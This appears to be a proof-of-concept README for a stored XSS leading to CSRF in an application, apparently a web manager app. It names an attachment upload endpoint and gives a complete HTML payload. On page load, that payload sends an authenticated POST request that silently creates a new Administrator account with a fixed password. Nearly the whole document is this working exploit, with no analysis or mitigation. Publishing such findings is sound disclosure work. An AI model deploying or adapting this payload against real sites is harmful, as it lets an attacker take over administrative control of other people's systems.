# POC_10072026_Manager_4
XSS_to_CSRF_create_New_Admin_account





https://github.com/user-attachments/assets/3191a44c-5ea2-4531-afe6-2f47b1d712db





End-Point:
  /new-attachment?


Payload:

```
<!DOCTYPE html>
<html>
<body>

<p id="result">Creating admin...</p>

<script>
async function createAdmin() {
  const response = await fetch("/user-form", {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      "HX-Request": "true",
      "HX-Boosted": "true",
      "HX-Trigger": "CreateNewAdmin"
    },
    body: "Name=Create_New_Admin&EmailAddress=test%40gmail.com&Username=NewAdmin&Password=12345&Type=Administrator"
  });

  const data = await response.text();
  document.getElementById("result").innerHTML = data;
}

// Execute once when the page loads
window.addEventListener("DOMContentLoaded", createAdmin);
</script>

</body>
</html>
```
